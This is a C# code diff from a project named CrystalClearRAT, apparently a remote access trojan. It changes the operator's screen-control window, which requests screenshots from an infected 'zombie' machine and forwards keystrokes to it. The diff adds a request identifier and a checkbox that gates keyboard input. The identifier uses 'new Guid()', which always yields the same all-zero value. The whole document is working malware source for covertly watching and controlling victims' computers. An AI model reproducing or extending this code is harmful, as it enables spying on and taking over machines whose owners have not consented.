@@ -29,12 +29,15 @@ namespace CrystalClearRAT.Windows
         int minTimerInterval = 100;
         bool sendRunning;
 
+        private string screenControlIdentifier;
+
         private Zombie zombie;
         DispatcherTimer screenshotTimer = new DispatcherTimer();
 
         public ScreenControlWindow(Zombie zombie)
         {
             InitializeComponent();
+            screenControlIdentifier = new Guid().ToString();
             this.zombie = zombie;
             FunctionManager.ImageReceived += OnImageReceived;
             this.zombie.Disconnected += OnZombieDisconnected;
@@ -49,8 +52,12 @@ namespace CrystalClearRAT.Windows
 
         private void OnImageReceived(object sender, EventArgs e)
         {
-            byte[] imageData = (e as ImageArgs).Data;
-            Dispatcher.Invoke(() => { screenImage.Source = LoadImage(imageData); });
+            ImageArgs args = (e as ImageArgs);
+            if (args.ID == screenControlIdentifier)
+            {
+                byte[] imageData = args.Data;
+                Dispatcher.Invoke(() => { screenImage.Source = LoadImage(imageData); });
+            }
 
         }
 
@@ -114,7 +121,7 @@ namespace CrystalClearRAT.Windows
 
         private void screenshotTimerTick(object sender, EventArgs e)
         {
-            Server.Send(Screenshot.Request(), zombie);
+            Server.Send(Screenshot.Request(screenControlIdentifier), zombie);
         }
 
         private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
@@ -136,8 +143,9 @@ namespace CrystalClearRAT.Windows
 
         private void Window_KeyDown(object sender, KeyEventArgs e)
         {
-            if(screenshotTimer.IsEnabled)
-            Server.Send(ControlInput.KeyInfo(KeyInterop.VirtualKeyFromKey((e.Key))), zombie);
+            if (keyboardInputCheckBox.IsChecked == true)
+                if (screenshotTimer.IsEnabled)
+                    Server.Send(ControlInput.KeyInfo(KeyInterop.VirtualKeyFromKey((e.Key))), zombie);
         }
     }
 }
